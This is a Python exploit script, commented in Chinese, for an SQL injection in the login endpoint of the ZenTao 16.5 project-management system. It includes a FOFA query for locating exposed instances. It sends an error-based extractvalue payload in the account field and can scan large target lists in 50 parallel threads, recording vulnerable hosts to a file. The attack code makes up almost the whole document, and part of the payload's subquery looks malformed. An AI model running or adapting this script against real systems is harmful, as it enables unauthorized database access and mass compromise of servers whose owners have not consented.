# 禅道 16.5 router.class.php SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="易软天创-禅道系统"

def banner():
    test = """
 ██████╗██╗  ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗       ███████╗ ██████╗ ██╗     
██╔════╝██║  ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗      ██╔════╝██╔═══██╗██║     
██║     ███████║███████║██╔██╗ ██║██║  ██║███████║██║   ██║█████╗███████╗██║   ██║██║     
██║     ██╔══██║██╔══██║██║╚██╗██║██║  ██║██╔══██║██║   ██║╚════╝╚════██║██║▄▄ ██║██║     
╚██████╗██║  ██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝      ███████║╚██████╔╝███████╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝       ╚══════╝ ╚══▀▀═╝ ╚══════╝

                                                    author:果冻
                                                    影响版本:禅道 v16.5
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='禅道 16.5 router.class.php SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/user-login.html"
    data = "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select%20md5%281%29%28%29%29%2C0x7e%29%29%29%23"
    try:
        response = requests.post(url=target + api_payload, data=data, verify=False, timeout=10)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f7' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[x]{target} 该站点无法访问")


if __name__ == '__main__':
    main()